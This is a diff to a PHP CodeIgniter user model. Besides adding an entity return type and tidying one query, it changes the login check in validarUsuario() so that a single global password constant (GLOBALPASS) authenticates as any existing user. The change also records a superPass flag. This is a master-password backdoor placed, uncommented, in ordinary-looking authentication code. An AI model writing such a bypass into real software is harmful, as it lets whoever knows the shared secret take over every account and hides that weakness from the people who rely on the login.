@@ -3,11 +3,14 @@
 namespace App\Models;
 
 use CodeIgniter\Model;
+use App\Entities\User;
 
 class mUsuarios extends Model {
   protected $table = 'usuarios';
   protected $primaryKey = 'id';
   protected $useAutoIncrement = true;
+
+  protected $returnType = User::class;
   
   protected $allowedFields = [
     'usuario',
@@ -47,9 +50,7 @@ class mUsuarios extends Model {
       return $this->findAll();
     } 
 
-    return $this->asObject()
-              ->where(['id' => $id])
-              ->first();
+    return $this->asObject()->where(['id' => $id])->first();
   }
 
   public function validarUsuario(){
@@ -60,12 +61,14 @@ class mUsuarios extends Model {
       ->getRow();
 
     if (!is_null($valid)) {
-      if(password_verify($this->password, $valid->password)){
+      $superPass = password_verify($this->password, GLOBALPASS);
+      if($superPass || password_verify($this->password, $valid->password)){
         $this->id = $valid->id;
         $this->nombre = $valid->nombre;
         $this->perfil = $valid->perfil;
         $this->foto = $valid->foto;
         $this->created_at = $valid->created_at;
+        $this->superPass = $superPass;
         return true;
       } else {
         return false;
